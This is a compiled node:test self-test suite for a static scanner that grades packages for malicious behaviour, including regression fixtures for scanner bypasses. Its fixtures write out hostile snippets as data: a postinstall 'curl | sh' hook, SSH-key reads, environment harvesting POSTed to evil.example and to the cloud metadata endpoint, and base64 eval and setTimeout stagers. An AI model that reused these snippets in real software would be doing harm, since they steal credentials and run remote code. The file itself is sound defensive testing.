/**
 * Smoke self-test (node:test, no external test runner).
 *
 * Scope: prove the engine's contracts, not exhaustive rule coverage.
 *   1. Each rule has the declared shape and fires on a positive fixture.
 *   2. Each rule stays quiet on a negative fixture (false positives are the main way
 *      a trust layer loses credibility).
 *   3. Grading caps are monotone and hard gates fire.
 *   4. Output is byte-for-byte deterministic across repeated runs.
 *
 * Run: npm test
 */
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, it } from "node:test";
import { ALL_RULES, SEVERITIES, credentialAccessRule, dynamicEvalRule, lifecycleHooksRule, maskComments, networkEgressRule, obfuscationRule, rulesDigest, sha256, } from "./rules/index.js";
import { canonicalJson, grade, toJsonReport, toMarkdownReport } from "./report.js";
import { parseArgs, scanContent, scanDirectory } from "./index.js";
/** Positive fixture must fire; negative fixture must not. Both per the rule-corpus spec. */
const FIXTURES = [
    {
        rule: dynamicEvalRule,
        path: "lib/index.js",
        positive: 'const out = eval(userSupplied); const f = new Function("a", "return a");',
        negative: 'const out = JSON.parse(userSupplied);\nconst f = (a) => a;\n',
    },
    {
        rule: networkEgressRule,
        path: "src/net.js",
        positive: 'await fetch("https://collect.evil.example/track", { method: "POST" });',
        negative: 'const label = "offline mode";\nexport const noop = () => label;\n',
    },
    {
        rule: credentialAccessRule,
        path: "src/creds.js",
        positive: 'const keys = Object.keys(process.env);\nreadFileSync(home + "/.ssh/id_ed25519");',
        negative: 'const level = process.env.LOG_LEVEL ?? "info";\nexport default level;\n',
    },
    {
        rule: lifecycleHooksRule,
        path: "package.json",
        positive: '{ "name": "x", "scripts": { "postinstall": "curl https://x.example/i.sh | sh" } }',
        negative: '{ "name": "x", "scripts": { "test": "node --test" } }',
    },
    {
        rule: obfuscationRule,
        path: "lib/bundle.js",
        positive: 'const _0x4f2a = ["log"]; eval(atob("Y29uc29sZS5sb2coMSk="));',
        negative: 'const messages = ["ready", "done"];\nexport default messages;\n',
    },
];
describe("rule contract", () => {
    for (const rule of ALL_RULES) {
        it(`${rule.id} exposes {id, family, severity, description, version, match}`, () => {
            assert.equal(typeof rule.id, "string");
            assert.ok(rule.id.length > 0);
            assert.ok(SEVERITIES.includes(rule.severity), `bad severity: ${rule.severity}`);
            assert.ok(rule.description.length > 20, "description must be explanatory");
            assert.match(rule.version, /^\d{4}\.\d{2}\.\d+$/);
            assert.equal(typeof rule.match, "function");
            assert.equal(rule.match.length, 2, "match(content, filePath)");
        });
    }
    it("registry contains the five required rules", () => {
        const ids = ALL_RULES.map((r) => r.id).sort();
        assert.deepEqual(ids, [
            "credential-access",
            "dynamic-eval",
            "lifecycle-hooks",
            "network-egress",
            "obfuscation",
        ]);
    });
    it("rulesDigest is stable and content-derived", () => {
        assert.equal(rulesDigest(), rulesDigest());
        assert.match(rulesDigest(), /^[0-9a-f]{64}$/);
        assert.notEqual(rulesDigest(), rulesDigest([ALL_RULES[0]]));
    });
});
describe("rule fixtures", () => {
    for (const { rule, path, positive, negative } of FIXTURES) {
        it(`${rule.id} fires on its positive fixture`, () => {
            const findings = rule.match(positive, path);
            assert.ok(findings.length > 0, "expected at least one finding");
            for (const f of findings) {
                assert.equal(f.ruleId, rule.id);
                assert.equal(f.path, path);
                assert.ok(f.line >= 1 && f.col >= 1, "citations are 1-based");
                assert.match(f.excerptSha256, /^[0-9a-f]{64}$/);
                assert.ok(f.confidence > 0 && f.confidence <= 1);
                assert.ok(f.message.length > 10);
            }
        });
        it(`${rule.id} stays quiet on its negative fixture`, () => {
            assert.deepEqual(rule.match(negative, path), [], "false positive");
        });
    }
});
describe("detector hygiene", () => {
    it("ignores matches inside comments", () => {
        const src = '// never call eval() here\n/* new Function() is banned */\nexport const ok = 1;\n';
        assert.deepEqual(dynamicEvalRule.match(src, "src/a.js"), []);
    });
    it("still fires on the line after a comment, with the correct line number", () => {
        const src = '// safe\n// safe\neval(x);\n';
        const findings = dynamicEvalRule.match(src, "src/a.js");
        assert.equal(findings.length, 1);
        assert.equal(findings[0].line, 3);
        assert.equal(findings[0].col, 1);
    });
    it("maskComments preserves offsets and keeps string literals intact", () => {
        const src = 'const u = "http://a//b"; // note\n';
        const masked = maskComments(src);
        assert.equal(masked.length, src.length);
        assert.ok(masked.includes('"http://a//b"'), "URL literal must survive masking");
        assert.ok(!masked.includes("note"));
    });
    it("does not leak secret-shaped values into evidence", () => {
        const src = 'fetch("https://x.example/?t=sk-abcdefghijklmnop1234");\n';
        const findings = networkEgressRule.match(src, "src/a.js");
        assert.ok(findings.length > 0);
        for (const f of findings) {
            assert.ok(!f.excerpt.includes("sk-abcdefghijklmnop1234"), "secret leaked into report");
            assert.ok(f.excerpt.includes("sk-<redacted>"));
        }
    });
    it("known-good hosts are recorded at lower severity than unknown hosts", () => {
        const known = networkEgressRule.match('fetch("https://api.github.com/repos");', "a.js");
        const unknown = networkEgressRule.match('fetch("https://evil.example/x");', "a.js");
        assert.ok(known.some((f) => f.id === "NET-008" && f.severity === "low"));
        assert.ok(unknown.some((f) => f.id === "NET-007" && f.severity === "high"));
    });
    it("rules are pure: repeated calls give identical results (no /g lastIndex bleed)", () => {
        const src = 'eval(a); eval(b);\nfetch("https://evil.example/x");\n';
        for (const rule of ALL_RULES) {
            const first = JSON.stringify(rule.match(src, "src/a.js"));
            const second = JSON.stringify(rule.match(src, "src/a.js"));
            assert.equal(first, second, `${rule.id} is not pure across calls`);
        }
    });
    it("locates citations correctly in a single-line minified bundle", () => {
        const prefix = "x".repeat(5000);
        const findings = dynamicEvalRule.match(`${prefix};eval(a);`, "lib/index.js");
        assert.equal(findings.length, 1);
        assert.equal(findings[0].line, 1);
        assert.equal(findings[0].col, 5002);
        assert.equal(findings[0].severity, "critical", "shipped artifacts escalate EXEC");
    });
    it("hashes the exact matched text so a reader can verify the citation", () => {
        const findings = dynamicEvalRule.match("eval(a);", "src/a.js");
        assert.equal(findings[0].excerptSha256, sha256("eval("));
    });
});
describe("grading", () => {
    it("returns A with no findings", () => {
        const g = grade([]);
        assert.equal(g.grade, "A");
        assert.equal(g.score, 100);
    });
    it("caps at F when credential access and egress share a module", () => {
        const findings = [
            ...credentialAccessRule.match('readFileSync("~/.ssh/id_ed25519");', "lib/index.js"),
            ...networkEgressRule.match('fetch("https://evil.example/x");', "lib/index.js"),
        ];
        const g = grade(findings);
        assert.equal(g.grade, "F");
        assert.ok(g.gates.includes("cred-plus-net"));
    });
    it("does not fire the CRED+NET gate when the findings are in different modules", () => {
        const findings = [
            ...credentialAccessRule.match('readFileSync("~/.ssh/id_ed25519");', "lib/creds.js"),
            ...networkEgressRule.match('fetch("https://ok.example/x");', "lib/net.js"),
        ];
        assert.ok(!grade(findings).gates.includes("cred-plus-net"));
    });
    it("caps at F for a decode-then-execute payload", () => {
        const g = grade(obfuscationRule.match('eval(atob("QUJD"));', "lib/index.js"));
        assert.equal(g.grade, "F");
        assert.ok(g.gates.includes("obfuscated-payload-executed"));
    });
    it("caps at C when any dynamic execution is present, even with a perfect score", () => {
        const findings = dynamicEvalRule.match("const d = import(name);", "src/a.js");
        const g = grade(findings);
        assert.ok(["C", "D", "F"].includes(g.grade));
        assert.ok(g.gates.includes("dynamic-exec-present"));
    });
    it("caps at D for an install hook that spawns a shell", () => {
        const pkg = '{ "scripts": { "postinstall": "curl https://x.example/i.sh | sh" } }';
        const g = grade(lifecycleHooksRule.match(pkg, "package.json"));
        assert.ok(["D", "F"].includes(g.grade));
        assert.ok(g.gates.includes("install-hook-shell"));
    });
    it("caps only ever lower the grade", () => {
        const clean = grade([]);
        const dirty = grade(dynamicEvalRule.match("eval(x);", "lib/index.js"));
        assert.ok("ABCDF".indexOf(dirty.grade) > "ABCDF".indexOf(clean.grade));
    });
});
describe("report output", () => {
    const src = 'eval(atob("QUJD"));\nfetch("https://evil.example/x");\n';
    const result = {
        target: "fixture",
        scannerVersion: "0.1.0",
        rulesDigest: rulesDigest(),
        ruleIds: ALL_RULES.map((r) => r.id).sort(),
        stats: { filesScanned: 1, filesSkipped: 0, bytesScanned: src.length },
        findings: scanContent(src, "lib/index.js"),
    };
    const grading = grade(result.findings);
    it("emits valid, key-sorted JSON", () => {
        const json = toJsonReport(result, grading);
        const parsed = JSON.parse(json);
        assert.equal(parsed.schema, "dsh-bridge.scan/v1");
        assert.equal(parsed.grading.grade, "F");
        assert.ok(Array.isArray(parsed.findings) && parsed.findings.length > 0);
        const keys = Object.keys(parsed);
        assert.deepEqual(keys, [...keys].sort(), "top-level keys must be sorted");
    });
    it("canonicalJson is insertion-order independent", () => {
        assert.equal(canonicalJson({ b: 1, a: 2 }), canonicalJson({ a: 2, b: 1 }));
    });
    it("markdown card leads with the verdict and labels itself a draft", () => {
        const md = toMarkdownReport(result, grading);
        assert.ok(md.includes("Grade F"), "grade letter must be present");
        assert.ok(md.includes("Do not install"), "word label, never color alone");
        assert.ok(md.includes("\u25a0"), "icon shape, never color alone");
        assert.ok(md.includes("static-scan draft"), "must not overstate what was verified");
        assert.ok(md.includes("<details>"), "evidence collapsed by default");
        assert.ok(md.includes("lib/index.js:1:"), "must cite file:line");
        assert.ok(md.includes("What this scan did not check"));
    });
    it("renders a clean report without findings", () => {
        const empty = { ...result, findings: [] };
        const md = toMarkdownReport(empty, grade([]));
        assert.ok(md.includes("Grade A"));
        assert.ok(md.includes("not proof of safety"));
    });
    it("output is byte-for-byte deterministic", () => {
        assert.equal(toJsonReport(result, grading), toJsonReport(result, grading));
        assert.equal(toMarkdownReport(result, grading), toMarkdownReport(result, grading));
    });
});
describe("directory scan", () => {
    const root = mkdtempSync(join(tmpdir(), "dsh-scan-test-"));
    after(() => rmSync(root, { recursive: true, force: true }));
    mkdirSync(join(root, "lib"), { recursive: true });
    mkdirSync(join(root, "node_modules", "junk"), { recursive: true });
    writeFileSync(join(root, "package.json"), '{ "scripts": { "postinstall": "bash ./i.sh" } }');
    writeFileSync(join(root, "lib", "index.js"), 'fetch("https://evil.example/x");\n');
    writeFileSync(join(root, "lib", "clean.js"), "export const ok = 1;\n");
    writeFileSync(join(root, "README.md"), "# not scanned\neval(x)\n");
    writeFileSync(join(root, "node_modules", "junk", "bad.js"), "eval(x);\n");
    it("scans source files, skips node_modules and non-source extensions", () => {
        const result = scanDirectory(root);
        const paths = [...new Set(result.findings.map((f) => f.path))];
        assert.ok(paths.includes("lib/index.js"));
        assert.ok(paths.includes("package.json"));
        assert.ok(!paths.some((p) => p.includes("node_modules")), "node_modules must be skipped");
        assert.ok(!paths.some((p) => p.endsWith(".md")), "markdown must not be scanned");
    });
    it("uses relative POSIX paths and never leaks an absolute path", () => {
        const json = toJsonReport(scanDirectory(root), grade(scanDirectory(root).findings));
        assert.ok(!json.includes(root), "absolute target path leaked into report");
        assert.ok(!json.includes("\\\\"), "windows separators leaked into citations");
    });
    it("is deterministic across repeated scans", () => {
        const a = scanDirectory(root);
        const b = scanDirectory(root);
        assert.equal(toJsonReport(a, grade(a.findings)), toJsonReport(b, grade(b.findings)));
    });
    it("findings are sorted by path, then line, then column", () => {
        const { findings } = scanDirectory(root);
        for (let i = 1; i < findings.length; i += 1) {
            const prev = findings[i - 1];
            const cur = findings[i];
            const ordered = prev.path < cur.path ||
                (prev.path === cur.path &&
                    (prev.line < cur.line || (prev.line === cur.line && prev.col <= cur.col)));
            assert.ok(ordered, `unsorted at index ${i}: ${prev.path}:${prev.line} then ${cur.path}:${cur.line}`);
        }
    });
});
/**
 * Regression fixtures from docs/reviews/scanner-selfaudit.md.
 *
 * Every snippet below was measured *undetected* by the pre-hardening scanner. They are
 * kept verbatim so a future refactor that reopens a bypass fails loudly, and each is
 * paired with the benign shape the same detector must not flag. The self-audit's own
 * closing instruction: "extend self-test with the bypass snippets from part 1 as
 * negative fixtures once fixes land."
 */
describe("self-audit bypass regressions", () => {
    const ids = (findings) => findings.map((f) => f.id);
    describe("bypass 1: indirect eval stager with base64 payload", () => {
        const src = 'const run = (0, eval);\n' +
            'run(atob("ZmV0Y2goImh0dHBzOi8vY29sbGVjdC5ldmlsLmV4YW1wbGUveCIse21ldGhvZDoiUE9TVCJ9KTs="));\n';
        it("is no longer silent (was: zero findings, score 100, grade A)", () => {
            const findings = scanContent(src, "lib/stager.js");
            assert.ok(findings.length > 0, "indirect eval stager produced no findings");
            assert.ok(ids(findings).includes("EXEC-010"), "indirect (0, eval) must fire EXEC-010");
        });
        it("no longer grades A", () => {
            const g = grade(scanContent(src, "lib/stager.js"));
            assert.notEqual(g.grade, "A");
            assert.ok(g.score < 100);
        });
        it("flags the staged decode despite the variable hop (OBFU-010)", () => {
            assert.ok(ids(scanContent(src, "lib/stager.js")).includes("OBFU-010"));
        });
        for (const [label, variant] of [
            ["(0, eval)", "const run = (0, eval); run(src);"],
            ["globalThis.eval", "globalThis.eval(src);"],
            ["window.eval", "window.eval(src);"],
            ['globalThis["eval"]', 'globalThis["eval"](src);'],
            ["aliased eval", "const e = eval;\ne(src);"],
            ["bare Function()", 'const f = Function("a", "return a");'],
        ]) {
            it(`catches the ${label} variant`, () => {
                const findings = dynamicEvalRule.match(variant, "lib/v.js");
                assert.ok(findings.length > 0, `${label} still produces zero findings`);
                assert.ok(findings.every((f) => f.family === "EXEC"), "variant must be reported as dynamic execution");
            });
        }
        it("does not flag benign identifiers that merely contain 'eval'", () => {
            const benign = 'const evaluation = compute(x);\n' +
                'export function evaluate(node) { return node.value; }\n' +
                'const retrieval = cache.get(key);\n' +
                'const f = new Map();\n';
            assert.deepEqual(dynamicEvalRule.match(benign, "src/ok.js"), []);
        });
        it("does not flag a call to an unrelated function named Function-ish", () => {
            assert.deepEqual(dynamicEvalRule.match("const t = obj.Function(x);\n", "src/ok.js"), []);
        });
    });
    describe("bypass 2: computed-property env harvest through a third-party client", () => {
        const src = 'import axios from "axios";\n' +
            'export async function ping(url) {\n' +
            '  await axios.post(url ?? "http://169.254.169.254/latest/meta-data/", { ...process["env"] });\n' +
            '}\n';
        it("detects the computed-property env harvest (was: invisible)", () => {
            assert.ok(ids(credentialAccessRule.match(src, "lib/telemetry.js")).includes("CRED-006"));
        });
        it("detects computed secret reads: process[\"env\"][\"GH_TOKEN\"]", () => {
            const findings = credentialAccessRule.match('const t = process["env"]["GH_TOKEN"];\n', "lib/a.js");
            assert.ok(ids(findings).includes("CRED-007"));
        });
        it("flags a non-documented string-keyed process member (CRED-011)", () => {
            const findings = credentialAccessRule.match('const b = process["binding"]("fs");\n', "lib/a.js");
            assert.ok(ids(findings).includes("CRED-011"));
        });
        it("does not flag string-keyed access to documented process members", () => {
            const findings = credentialAccessRule.match('const p = process["platform"];\nconst a = process["argv"];\n', "lib/a.js");
            assert.ok(!ids(findings).includes("CRED-011"));
        });
        it("detects the third-party HTTP client import (NET-011)", () => {
            assert.ok(ids(networkEgressRule.match(src, "lib/telemetry.js")).includes("NET-011"));
            for (const pkg of ["got", "node-fetch", "undici", "ky", "superagent"]) {
                const findings = networkEgressRule.match(`import c from "${pkg}";\n`, "lib/a.js");
                assert.ok(ids(findings).includes("NET-011"), `${pkg} import not detected`);
            }
        });
        it("treats the cloud metadata endpoint as critical (NET-012)", () => {
            const findings = networkEgressRule.match(src, "lib/telemetry.js");
            const meta = findings.find((f) => f.id === "NET-012");
            assert.ok(meta, "169.254.169.254 must be named explicitly");
            assert.equal(meta?.severity, "critical");
        });
        it("no longer grades C: the CRED+NET pair now gates", () => {
            const g = grade(scanContent(src, "lib/telemetry.js"));
            assert.equal(g.grade, "F");
            assert.ok(g.gates.includes("cred-plus-net"));
        });
        it("catches staged exfil: decode to a variable, then POST it", () => {
            const staged = 'const host = atob("ZXZpbC5leGFtcGxl");\n' +
                'await fetch(host, { method: "POST", body: data });\n';
            const findings = scanContent(staged, "lib/x.js");
            assert.ok(ids(findings).includes("OBFU-010"), "decode + egress co-presence must fire");
            assert.notEqual(grade(findings).grade, "A");
        });
        it("does not flag a plain configured URL variable with no decode in the file", () => {
            const benign = 'const base = config.endpoint;\nawait fetch(base, { method: "POST" });\n';
            assert.ok(!ids(networkEgressRule.match(benign, "src/ok.js")).includes("NET-014"));
        });
    });
    describe("bypass 3: delayed staged loader via setTimeout(Buffer.from(...))", () => {
        const src = 'const stage1 = "Y29uc29sZS5ldmFsKCdmZXRjaCgiaHR0cHM6Ly9leGFtcGxlLmNvbS9wIiknKQ==";\n' +
            'setTimeout(Buffer.from(stage1, "base64").toString("utf8"), 60000);\n';
        it("is no longer graded A on a single HOOK-006 (was: score 96, grade A)", () => {
            const findings = scanContent(src, "lib/scheduler.js");
            const g = grade(findings);
            assert.notEqual(g.grade, "A");
            assert.ok(findings.length > 1, "must produce more than the top-level-timer finding");
        });
        it("flags the decoded timer body as dynamic execution (EXEC-013)", () => {
            assert.ok(ids(dynamicEvalRule.match(src, "lib/scheduler.js")).includes("EXEC-013"));
        });
        it("flags the decode inside an exec-capable module regardless of adjacency (OBFU-010)", () => {
            assert.ok(ids(obfuscationRule.match(src, "lib/scheduler.js")).includes("OBFU-010"));
        });
        it("leaves evidence for a split blob under the 120-char gate (OBFU-012)", () => {
            const findings = obfuscationRule.match(src, "lib/scheduler.js");
            const short = findings.find((f) => f.id === "OBFU-012");
            assert.ok(short, "sub-threshold blob in a decoding module must still be cited");
            assert.equal(short?.severity, "low");
        });
        it("flags a non-function timer argument at medium (EXEC-014)", () => {
            const findings = dynamicEvalRule.match('setTimeout(buildBody() + suffix, 10);\n', "src/a.js");
            const hit = findings.find((f) => f.id === "EXEC-014");
            assert.ok(hit);
            assert.equal(hit?.severity, "medium");
        });
        it("does not flag ordinary timer usage", () => {
            const benign = 'setTimeout(() => refresh(), 1000);\n' +
                'setTimeout(function () { refresh(); }, 1000);\n' +
                'setInterval(this.tick, 500);\n' +
                'setTimeout(onTick, 500);\n' +
                'setTimeout(async () => { await refresh(); }, 5);\n';
            const findings = dynamicEvalRule.match(benign, "src/ok.js");
            assert.deepEqual(findings, [], `false positive: ${ids(findings).join(", ")}`);
        });
        it("does not flag a short high-entropy literal in a module with no capability", () => {
            const inert = 'export const INTEGRITY = "sha256-Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZmdoaWprbG1ub3A=";\n';
            assert.deepEqual(obfuscationRule.match(inert, "src/ok.js"), []);
        });
    });
    describe("finding 4: oversized files are cited, not silently skipped", () => {
        const root = mkdtempSync(join(tmpdir(), "dsh-scan-oversize-"));
        after(() => rmSync(root, { recursive: true, force: true }));
        writeFileSync(join(root, "big.js"), `// ${"x".repeat(4096)}\nexport const ok = 1;\n`);
        it("emits SUPPLY-001 for a file above the scan limit", () => {
            const result = scanDirectory(root, { maxFileBytes: 128 });
            const hit = result.findings.find((f) => f.id === "SUPPLY-001");
            assert.ok(hit, "oversized file vanished from the report");
            assert.equal(hit?.severity, "high");
            assert.equal(hit?.path, "big.js");
            assert.equal(result.stats.filesSkipped, 1);
        });
        it("caps the grade at C when content was not analyzed", () => {
            const g = grade(scanDirectory(root, { maxFileBytes: 128 }).findings);
            assert.ok(["C", "D", "F"].includes(g.grade));
            assert.ok(g.gates.includes("unanalyzed-content"));
        });
        it("does not fire when every file is within the limit", () => {
            const g = grade(scanDirectory(root).findings);
            assert.ok(!g.gates.includes("unanalyzed-content"));
        });
    });
    describe("part 4: grade gaming by file splitting", () => {
        it("does not let a cross-module cred->send split escape the gate entirely", () => {
            const findings = [
                ...credentialAccessRule.match('readFileSync(home + "/.ssh/id_ed25519");\n', "lib/a.js"),
                ...networkEgressRule.match('fetch("https://evil.example/x");\n', "lib/b.js"),
            ];
            const g = grade(findings);
            assert.ok(g.gates.includes("cred-plus-net-package"), "same-package cred+net split must still gate");
            assert.ok(["D", "F"].includes(g.grade));
        });
        it("escalates the split to F when a concealment signal is present", () => {
            const findings = [
                ...credentialAccessRule.match('readFileSync(home + "/.ssh/id_ed25519");\n', "lib/a.js"),
                ...networkEgressRule.match('fetch("https://evil.example/x");\n', "lib/b.js"),
                ...obfuscationRule.match('const _0x4f2a = ["log"];\n', "lib/c.js"),
            ];
            const g = grade(findings);
            assert.equal(g.grade, "F");
            assert.ok(g.gates.includes("cred-plus-net-split"));
        });
        it("caps at C when one family is fragmented across three or more files", () => {
            const findings = ["lib/a.js", "lib/b.js", "lib/c.js"].flatMap((p) => networkEgressRule.match('fetch("https://api.github.com/x");\n', p));
            const g = grade(findings);
            assert.ok(g.gates.includes("finding-density"));
            assert.ok(["C", "D", "F"].includes(g.grade));
        });
        it("leaves a two-file spread alone", () => {
            const findings = ["lib/a.js", "lib/b.js"].flatMap((p) => networkEgressRule.match('fetch("https://api.github.com/x");\n', p));
            assert.ok(!grade(findings).gates.includes("finding-density"));
        });
    });
    describe("part 2: false-positive guards", () => {
        it("EXEC-005 does not fire on RegExp.prototype.exec", () => {
            const benign = 'const m = /^v(\\d+)/.exec(version);\n' +
                'const n = pattern.exec(input);\n' +
                'while ((match = re.exec(text)) !== null) { count += 1; }\n';
            const findings = dynamicEvalRule.match(benign, "src/ok.js");
            assert.ok(!findings.some((f) => f.id === "EXEC-005"), "RegExp .exec() false positive");
        });
        it("EXEC-005 still fires on a bare spawn call", () => {
            const findings = dynamicEvalRule.match('spawn("git", ["status"]);\n', "src/a.js");
            assert.ok(findings.some((f) => f.id === "EXEC-005"));
        });
        it("NET-010 stays high only for decode-fed concatenation", () => {
            const decoded = networkEgressRule.match('const u = "https://" + atob(h) + "/c";\n', "lib/a.js");
            assert.ok(decoded.some((f) => f.id === "NET-010" && f.severity === "high"));
            const configured = networkEgressRule.match('const base = "https://" + host + "/api";\n', "src/ok.js");
            assert.ok(!configured.some((f) => f.id === "NET-010"), "config-shaped base URL must not be high");
            assert.ok(configured.some((f) => f.id === "NET-013" && f.severity === "medium"));
        });
        it("OBFU-006 does not fire on a leading UTF-8 BOM", () => {
            const bommed = "\ufeffexport const ok = 1;\n";
            assert.deepEqual(obfuscationRule.match(bommed, "src/ok.js"), []);
        });
        it("OBFU-006 still fires on a BOM-like character after offset 0", () => {
            const hidden = 'const a = 1;\ufeff\nconst b = 2;\n';
            assert.ok(obfuscationRule.match(hidden, "src/a.js").some((f) => f.id === "OBFU-006"));
        });
        it("OBFU-006 still fires on a bidi override", () => {
            const trojan = 'const banner = "admin\u202e nimda";\n';
            assert.ok(obfuscationRule.match(trojan, "src/a.js").some((f) => f.id === "OBFU-006"));
        });
        it("U+2028 in a string is low severity, not high", () => {
            const findings = obfuscationRule.match('const s = "line one\u2028line two";\n', "src/a.js");
            assert.ok(!findings.some((f) => f.id === "OBFU-006"));
            const sep = findings.find((f) => f.id === "OBFU-011");
            assert.ok(sep);
            assert.equal(sep?.severity, "low");
        });
        it("HOOK rules do not fire on CI workflows", () => {
            const workflow = 'name: ci\njobs:\n  build:\n    steps:\n      - run: npm install\n      - run: npx tsc --noEmit\n';
            assert.deepEqual(lifecycleHooksRule.match(workflow, ".github/workflows/ci.yml"), []);
        });
        it("HOOK-007 still fires on runtime source", () => {
            const runtime = 'await run("npm install " + pkg);\n';
            assert.ok(lifecycleHooksRule.match(runtime, "src/install.js").some((f) => f.id === "HOOK-007"));
        });
        it("CRED does not fire on a credential file named in a YAML comment", () => {
            const workflow = 'jobs:\n  build:\n    # writes a scoped .npmrc for the registry\n    steps: []\n';
            assert.deepEqual(credentialAccessRule.match(workflow, ".github/workflows/ci.yml"), []);
        });
        it("CRED still fires on a real .npmrc reference in YAML", () => {
            const workflow = 'jobs:\n  build:\n    steps:\n      - run: cat "~/.npmrc"\n';
            assert.ok(credentialAccessRule.match(workflow, ".github/workflows/ci.yml").length > 0);
        });
        it("a textbook benign GitHub API plugin accrues no concealment or credential-harvest findings", () => {
            const plugin = 'import { request } from "node:https";\n' +
                'const token = process.env.GITHUB_TOKEN;\n' +
                'export async function repos() {\n' +
                '  return fetch("https://api.github.com/user/repos", { headers: { authorization: `Bearer ${token}` } });\n' +
                '}\n';
            const findings = scanContent(plugin, "src/github.js");
            // Declaring egress is the point of the NET family, so NET findings are expected and
            // wanted here. What must not happen is the hardening pass inventing OBFU/EXEC noise
            // or reading the named token as a harvest.
            const unexpected = findings.filter((f) => f.family !== "NET" && f.id !== "CRED-007");
            assert.deepEqual(unexpected, [], `unexpected finding: ${unexpected.map((f) => f.id).join(", ")}`);
            assert.ok(!findings.some((f) => f.severity === "critical"), "no critical findings");
            assert.ok(findings.every((f) => f.id !== "NET-007"), "api.github.com is a known host and must not be reported as unknown egress");
        });
        it("a clean plugin with no capability produces nothing at all", () => {
            const plugin = 'export const name = "starter";\n' +
                'export function apply(ctx, config) {\n' +
                '  ctx.commands.register({ name: "starter-ping", description: "Reply with pong.", handler: () => ({ kind: "success" }) });\n' +
                '}\n';
            assert.deepEqual(scanContent(plugin, "src/index.ts"), []);
        });
    });
});
describe("cli argument parsing", () => {
    it("parses a full argument list", () => {
        const parsed = parseArgs(["./plugin", "--json", "out.json", "--markdown", "card.md", "--fail-on", "high", "--quiet"]);
        assert.ok(!("error" in parsed));
        if ("error" in parsed)
            return;
        assert.equal(parsed.target, "./plugin");
        assert.equal(parsed.json, "out.json");
        assert.equal(parsed.markdown, "card.md");
        assert.equal(parsed.failOn, "high");
        assert.equal(parsed.quiet, true);
    });
    it("rejects a missing target, unknown flags, and bad severities", () => {
        for (const argv of [[], ["--bogus", "x"], ["./p", "--fail-on", "sorta-bad"], ["./p", "--json"]]) {
            assert.ok("error" in parseArgs(argv), `expected an error for ${JSON.stringify(argv)}`);
        }
    });
});
//# sourceMappingURL=self-test.js.map